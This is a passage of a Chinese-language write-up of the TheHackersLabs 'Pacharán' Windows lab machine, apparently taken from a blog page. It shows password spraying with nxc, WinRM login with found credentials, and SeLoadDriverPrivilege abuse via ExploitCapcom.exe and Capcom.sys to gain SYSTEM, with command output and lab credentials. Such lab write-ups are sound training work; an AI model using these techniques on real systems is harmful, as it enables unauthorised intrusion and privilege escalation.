\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到\u003ccode\u003eWhisky\u003c/code\u003e的凭据，\u003ccode\u003eWhisky:MamasoyStream2er@\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003eTo Chivas Regal\u003c/h2\u003e\n\u003cp\u003e这里尝试了很多的攻击，例如 \u003ccode\u003eKerberoate\u003c/code\u003e等\u003c/p\u003e\n\u003cp\u003e再尝试枚举一下信息\u003c/p\u003e\n\u003cp\u003eSMB 中我们能注意到 \u003cstrong\u003e\u003ccode\u003ePDF Pro Virtual Printer WRITE\u003c/code\u003e\u003c/strong\u003e ，应该是打印机共享\u003c/p\u003e\n\u003cp\u003e并且描述：我是一名黑客，我修理打印机，通用文档转换器\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsPachar%C3%A1n/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试连接上\u003ccode\u003eRPCclient\u003c/code\u003e 枚举打印机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pacharán rpcclient 192.168.69.69 -U pacharan.thl/Whisky%MamasoyStream2er@ \nrpcclient $\u003e enumprinters\n        flags:[0x800000]\n        name:[\\\\192.168.69.69\\Soy Hacker y arreglo impresoras]\n        description:[\\\\192.168.69.69\\Soy Hacker y arreglo impresoras,Universal Document Converter,TurkisArrusPuchuchuSiu1]\n        comment:[Soy Hacker y arreglo impresoras]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们还看到描述后还带这个字符串 \u003ccode\u003eTurkisArrusPuchuchuSiu1\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e我们将其拿去进行密码喷洒\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pacharán nxc smb 192.168.69.69 -u users.txt -p \u003cspan class=\"hljs-string\"\u003e'TurkisArrusPuchuchuSiu1'\u003c/span\u003e --smb-timeout 9999                \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Administrador:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Invitado:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\krbtgt:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\DefaultAccount:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Orujo:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Ginebra:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Whisky:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Hendrick:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\Chivas Regal:TurkisArrusPuchuchuSiu1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到一个凭据：\u003ccode\u003eChivasRegal:TurkisArrusPuchuchuSiu1\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e就是我们上边看到远程管理组的用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pacharán nxc winrm 192.168.69.69 -u \u003cspan class=\"hljs-string\"\u003e'Chivas Regal'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'TurkisArrusPuchuchuSiu1'\u003c/span\u003e\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\Chivas Regal:TurkisArrusPuchuchuSiu1 (Pwn3d!)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eChivas Regal\u003c/code\u003e 用户可以读取 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\Chivas Regal\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e user.txt\nbb8b4xxxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eSeLoadDriverPrivilege\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003ewhoami\u003c/code\u003e 信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsPachar%C3%A1n/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e能找到 \u003ccode\u003eSeLoadDriverPrivilege\u003c/code\u003e ，这是默认的账户不存在的权限\u003c/p\u003e\n\u003cp\u003e能找一些存储库： \u003ca href=\"https://github.com/k4sth4/SeLoadDriverPrivilege\"\u003ehttps://github.com/k4sth4/SeLoadDriverPrivilege\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\temp\u003e .\\ExploitCapcom.exe LOAD C:\\temp\\Capcom.sys\n[*] Service Name: uciifgxe\n[+] Enabling SeLoadDriverPrivilege\n[+] SeLoadDriverPrivilege Enabled\n[+] Loading Driver: \\Registry\\User\\S-1-5-21-3046175042-3013395696-775018414-1108\\???????????????????\nNTSTATUS: 00000000, WinError: 0\n\n*Evil-WinRM* PS C:\\temp\u003e .\\ExploitCapcom.exe EXPLOIT \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e\n[*] Capcom.sys exploit\n[*] Capcom.sys handle was obtained as 0000000000000064\n[*] Shellcode was placed at 0000013180FE0008\n[+] Shellcode was executed\n[+] Token stealing was successful\n[+] Command Executed\nnt authority\\system\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功拿到 \u003ccode\u003esystem\u003c/code\u003e 用户权限\u003c/p\u003e\n\u003cp\u003e这里可以使用 \u003ccode\u003emsf\u003c/code\u003e 来弹，不多赘述….\u003c/p\u003e\n\u003cp\u003e最后运行恶意 \u003ccode\u003eexe\u003c/code\u003e 即可弹回来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsPachar%C3%A1n/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\Users\\Administrador\\Desktop\u003e\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\n\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\ncfa7cb1cc20e26c0428f9222d44c76a0  -\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e打印机那里有点没想到，要看描述\u003c/p\u003e\n\u003cp\u003e最后 SeLoadDriverPrivilege 卡了一下，\u003ccode\u003epayload\u003c/code\u003e需要改一下\u003c/p\u003e","title":"TheHackersLabs - Pacharán","date":"2025-07-27","updated":"2025-07-27","tags":["TheHackersLabs","Windows","SeLoadDriverPrivilege","Crack"],"categories":"靶机","comments":true,"description":"Pacharán https://labs.thehackerslabs.com/machine/61 Recon PortScan 枚举 SMB 匿名测试 可以使用匿名账户 直接用nxc全部拉下来 得到一个 txt 文件 Orujo.txt 像是一个凭据，测试一下 成功拿到 orujo 的凭据 域..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"TheHackersLabsPacharán"},"buildId":"wB9gCWCnDino7vEBKVpU-","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>